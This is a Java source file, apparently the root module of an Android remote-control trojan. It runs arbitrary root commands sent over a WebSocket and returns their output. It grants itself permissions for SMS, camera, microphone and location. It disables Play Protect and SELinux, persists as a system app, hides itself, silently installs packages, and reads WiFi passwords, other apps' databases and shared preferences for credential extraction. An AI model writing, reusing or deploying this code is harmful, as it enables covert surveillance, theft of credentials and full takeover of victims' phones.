package com.remote.control;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import okhttp3.WebSocket;

public class RootManager {

    private static final String TAG = "RootManager";

    private final Context context;
    private boolean rootAvailable = false;
    private boolean rootChecked = false;

    public RootManager(Context context) {
        this.context = context;
    }

    // ===== ROOT DETECTION =====

    /**
     * Check if device has root access (su binary exists and works)
     */
    public boolean isRooted() {
        if (rootChecked) return rootAvailable;
        rootChecked = true;

        // Method 1: Check common su paths
        String[] suPaths = {
                "/system/bin/su", "/system/xbin/su", "/sbin/su",
                "/data/local/su", "/data/local/bin/su", "/data/local/xbin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su",
                "/su/bin/su", "/magisk/.core/bin/su"
        };
        for (String path : suPaths) {
            if (new File(path).exists()) {
                rootAvailable = true;
                break;
            }
        }

        // Method 2: Try to execute su
        if (!rootAvailable) {
            try {
                Process process = Runtime.getRuntime().exec("su -c id");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = reader.readLine();
                if (line != null && line.contains("uid=0")) {
                    rootAvailable = true;
                }
                process.destroy();
            } catch (Exception e) {
                rootAvailable = false;
            }
        }

        // Method 3: Check for Magisk
        if (!rootAvailable) {
            try {
                Process process = Runtime.getRuntime().exec("magisk --version");
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = reader.readLine();
                if (line != null && !line.isEmpty()) {
                    rootAvailable = true;
                }
                process.destroy();
            } catch (Exception ignored) {
            }
        }

        Log.d(TAG, "Root available: " + rootAvailable);
        return rootAvailable;
    }

    // ===== ROOT SHELL EXECUTION =====

    /**
     * Execute a command as root (su)
     * Returns stdout, stderr, and exit code
     */
    public ShellResult executeAsRoot(String command) {
        ShellResult result = new ShellResult();
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();

            BufferedReader stdOut = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader stdErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            StringBuilder output = new StringBuilder();
            StringBuilder error = new StringBuilder();

            String line;
            while ((line = stdOut.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = stdErr.readLine()) != null) {
                error.append(line).append("\n");
            }

            result.exitCode = process.waitFor();
            result.stdout = output.toString().trim();
            result.stderr = error.toString().trim();

            os.close();
            stdOut.close();
            stdErr.close();
            process.destroy();

            Log.d(TAG, "Root cmd: " + command + " -> exit=" + result.exitCode);

        } catch (Exception e) {
            result.exitCode = -1;
            result.stderr = "Root error: " + e.getMessage();
            Log.e(TAG, "Root exec error", e);
        }
        return result;
    }

    /**
     * Execute command as root and send result via WebSocket
     */
    public void executeAsRoot(WebSocket webSocket, String command, String requestId) {
        new Thread(() -> {
            ShellResult result = executeAsRoot(command);
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", "root-result");
                msg.put("requestId", requestId);
                msg.put("command", command);
                msg.put("stdout", result.stdout);
                msg.put("stderr", result.stderr);
                msg.put("exitCode", result.exitCode);
                msg.put("timestamp", System.currentTimeMillis());
                if (webSocket != null) webSocket.send(msg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending root result", e);
            }
        }, "Root-" + requestId).start();
    }

    // ===== PRIVILEGE ESCALATION =====

    /**
     * Grant all dangerous permissions to this app via root
     */
    public void grantAllPermissions() {
        String pkg = context.getPackageName();
        String[] permissions = {
                "android.permission.READ_CONTACTS",
                "android.permission.READ_SMS",
                "android.permission.SEND_SMS",
                "android.permission.ACCESS_FINE_LOCATION",
                "android.permission.ACCESS_BACKGROUND_LOCATION",
                "android.permission.RECORD_AUDIO",
                "android.permission.CAMERA",
                "android.permission.READ_CALL_LOG",
                "android.permission.READ_PHONE_STATE",
                "android.permission.WRITE_EXTERNAL_STORAGE",
                "android.permission.READ_EXTERNAL_STORAGE"
        };

        StringBuilder cmd = new StringBuilder();
        for (String perm : permissions) {
            cmd.append("pm grant ").append(pkg).append(" ").append(perm).append(" ; ");
        }
        executeAsRoot(cmd.toString());
        Log.d(TAG, "All permissions granted via root");
    }

    /**
     * Make this app a Device Owner (highest privilege without root for MDM)
     */
    public ShellResult setDeviceOwner() {
        String pkg = context.getPackageName();
        String cmd = "dpm set-device-owner " + pkg + "/.DeviceAdminReceiver";
        return executeAsRoot(cmd);
    }

    /**
     * Install this app as a system app (survives factory reset on some ROMs)
     */
    public ShellResult installAsSystemApp() {
        String apkPath = context.getApplicationInfo().sourceDir;
        String pkg = context.getPackageName();
        String commands = "mount -o remount,rw /system ; " +
                "cp " + apkPath + " /system/priv-app/" + pkg + ".apk ; " +
                "chmod 644 /system/priv-app/" + pkg + ".apk ; " +
                "mount -o remount,ro /system";
        return executeAsRoot(commands);
    }

    /**
     * Disable Play Protect via root (Settings database manipulation)
     */
    public ShellResult disablePlayProtectRoot() {
        String commands = "settings put global package_verifier_enable 0 ; " +
                "settings put global verifier_verify_adb_installs 0 ; " +
                "settings put global upload_apk_enable 0 ; " +
                "pm disable com.android.vending/com.google.android.finsky.verifier.VerifyInstallerActivity ; " +
                "pm disable com.android.vending/com.google.android.finsky.verifier.VerifyInstallActivity";
        return executeAsRoot(commands);
    }

    /**
     * Disable SELinux enforcement (major security bypass)
     */
    public ShellResult disableSELinux() {
        return executeAsRoot("setenforce 0");
    }

    /**
     * Get SELinux status
     */
    public String getSELinuxStatus() {
        ShellResult result = executeAsRoot("getenforce");
        return result.stdout.trim();
    }

    /**
     * Silent install an APK without any user prompt (root required)
     */
    public ShellResult silentInstallApk(String apkPath) {
        return executeAsRoot("pm install -r -g " + apkPath);
    }

    /**
     * Silent uninstall a package (root required)
     */
    public ShellResult silentUninstall(String packageName) {
        return executeAsRoot("pm uninstall " + packageName);
    }

    /**
     * Disable a package completely (root required)
     */
    public ShellResult disablePackage(String packageName) {
        return executeAsRoot("pm disable-user --user 0 " + packageName);
    }

    /**
     * Enable a package (root required)
     */
    public ShellResult enablePackage(String packageName) {
        return executeAsRoot("pm enable " + packageName);
    }

    /**
     * Hide the app from package manager (pm hide)
     */
    public ShellResult hideApp() {
        return executeAsRoot("pm hide " + context.getPackageName());
    }

    /**
     * Read any file on the filesystem (root required)
     */
    public String readFile(String filePath) {
        ShellResult result = executeAsRoot("cat " + filePath);
        return result.exitCode == 0 ? result.stdout : null;
    }

    /**
     * Write to any file on the filesystem (root required)
     */
    public ShellResult writeFile(String filePath, String content) {
        // Escape single quotes in content
        String escaped = content.replace("'", "'\\''");
        return executeAsRoot("echo '" + escaped + "' > " + filePath);
    }

    /**
     * Get WiFi passwords stored on device (root required)
     */
    public String getWifiPasswords() {
        // Android 8+ stores in XML, older in wpa_supplicant.conf
        ShellResult result = executeAsRoot(
                "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null || " +
                "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null");
        return result.stdout;
    }

    /**
     * Dump all app databases (for credential extraction)
     */
    public ShellResult dumpAppDatabase(String packageName, String dbName) {
        String dbPath = "/data/data/" + packageName + "/databases/" + dbName;
        return executeAsRoot("sqlite3 " + dbPath + " .dump 2>/dev/null || cat " + dbPath);
    }

    /**
     * Get full device info with root privileges
     */
    public JSONObject getRootDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("rooted", isRooted());
            info.put("selinux", getSELinuxStatus());

            ShellResult idResult = executeAsRoot("id");
            info.put("rootId", idResult.stdout);

            ShellResult propResult = executeAsRoot("getprop ro.build.display.id");
            info.put("buildId", propResult.stdout);

            ShellResult kernelResult = executeAsRoot("uname -a");
            info.put("kernel", kernelResult.stdout);

            // Check if Magisk is installed
            ShellResult magisk = executeAsRoot("magisk --version 2>/dev/null");
            info.put("magiskVersion", magisk.stdout.isEmpty() ? "not installed" : magisk.stdout);

            // Check SuperSU
            ShellResult supersu = executeAsRoot("ls /system/app/SuperSU* 2>/dev/null");
            info.put("supersu", !supersu.stdout.isEmpty());

        } catch (Exception e) {
            Log.e(TAG, "Error getting root device info", e);
        }
        return info;
    }

    /**
     * Get all installed packages with their data directories
     */
    public ShellResult listAllPackagesDetailed() {
        return executeAsRoot("pm list packages -f");
    }

    /**
     * Key extraction - Read shared preferences of any app
     */
    public String readAppSharedPrefs(String packageName) {
        ShellResult result = executeAsRoot(
                "find /data/data/" + packageName + "/shared_prefs/ -name '*.xml' -exec cat {} \\;");
        return result.stdout;
    }

    // ===== STATUS / INFO =====

    /**
     * Full root status report
     */
    public void sendRootStatus(WebSocket webSocket) {
        new Thread(() -> {
            try {
                JSONObject msg = new JSONObject();
                msg.put("type", "root-status");
                msg.put("rooted", isRooted());
                if (isRooted()) {
                    msg.put("deviceInfo", getRootDeviceInfo());
                }
                msg.put("timestamp", System.currentTimeMillis());
                if (webSocket != null) webSocket.send(msg.toString());
            } catch (Exception e) {
                Log.e(TAG, "Error sending root status", e);
            }
        }).start();
    }

    // ===== INNER CLASSES =====

    public static class ShellResult {
        public String stdout = "";
        public String stderr = "";
        public int exitCode = -1;

        public JSONObject toJson() {
            JSONObject obj = new JSONObject();
            try {
                obj.put("stdout", stdout);
                obj.put("stderr", stderr);
                obj.put("exitCode", exitCode);
            } catch (Exception ignored) {
            }
            return obj;
        }
    }
}
